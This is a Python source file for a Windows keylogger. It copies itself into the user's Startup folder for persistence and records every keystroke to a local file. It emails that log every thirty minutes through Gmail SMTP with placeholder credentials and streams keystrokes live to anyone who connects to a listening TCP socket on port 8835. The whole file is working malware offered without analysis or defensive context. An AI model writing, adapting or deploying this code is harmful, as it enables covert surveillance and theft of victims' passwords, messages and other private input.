from pynput.keyboard import Key, Listener
import shutil
import os
import getpass
import socket
import threading
from datetime import datetime
import pathlib
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders
import time
import urllib.request
class keylogger():
    def __init__(self):
        self.file = ''
        self.socket = ''
        self.key = bytes('',"utf-8")
        try:
            shutil.copyfile("{}/keylogger.exe".format(os.getcwd()),
                "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe".format(getpass.getuser()))
        except:
            pass
        
        self.live = threading.Thread(target = self.live_method, args = ())
        self.mail = threading.Thread(target = self.mail_method, args = ())
        self.keylogger = threading.Thread(target = self.main, args = ())
        self.live.start()
        self.mail.start()
        self.keylogger.start()
        self.mail.join()
        self.live.join()
        self.keylogger.join()



    def mail_method(self):
        print("mail method started")
        while True:
            try:
                msg = MIMEMultipart()
                msg['From'] = "exemple@gmail.com"
                msg['To'] = COMMASPACE.join("exemple@gmail.com")
                msg['Date'] = formatdate(localtime=True)
                msg['Subject'] = "."

                msg.attach(MIMEText(".."))
                part = MIMEBase('application', "octet-stream")
                with open(str(os.getcwd()+ "\\asp.BLUE"), 'rb') as file:
                    part.set_payload(file.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition',
                                    'attachment; filename="{}"'.format(str("asp.BLUE")))
                    msg.attach(part)
                
                smtp = smtplib.SMTP('smtp.gmail.com')
                smtp.starttls()
                smtp.login("exemple@gmail.com","exemple_password")
                smtp.sendmail("exemple@gmail.com","exemple@gmail.com",msg.as_string())
                smtp.quit()
                self.file = open("asp.BLUE","w")
                self.file.close()
                time.sleep(1800)
            except:
                time.sleep(1800)
        
    def live_method(self):
        while True:
            print("\nlive started")
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.bind(('',8835))
            self.socket.listen(5)
            client, address = self.socket.accept()
            print("{} connected".format( address ))
            connected = True
            while connected == True:
                try:
                    if self.key != b"":
                        client.send(self.key)
                        print("sent {}".format(self.key))
                        time.sleep(0.105)
                except:
                    client.close()
                    self.socket.close()
                    connected = False
                
        
        
        
    def main(self):
        print("main started")
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            self.file = open("asp.BLUE","w")
            self.file.write("Startup on :: {} of {}\n".format(datetime.now(),getpass.getuser()))
            self.file.close()
            listener.join()

    def on_press(self,key):
        if(str(key).strip("'") == 'Key.enter'):
            self.key = b"\n"
            self.file = open("asp.BLUE","a")
            self.file.write(str(str("\\n").strip("'")+"\n"))
            self.file.close()
        elif(str(key).strip("'") == 'Key.space'):
            self.key = b" "
            self.file = open("asp.BLUE","a")
            self.file.write(str(" "))
            self.file.close()
        else:
            self.key = bytes(str(key).strip("'"),"utf-8")
            self.file = open("asp.BLUE","a")
            self.file.write(str(key).strip("'"))
            self.file.close()
    def on_release(self,key):
        self.key = b""
        
if __name__ == "__main__":
    keylogger1 = keylogger()
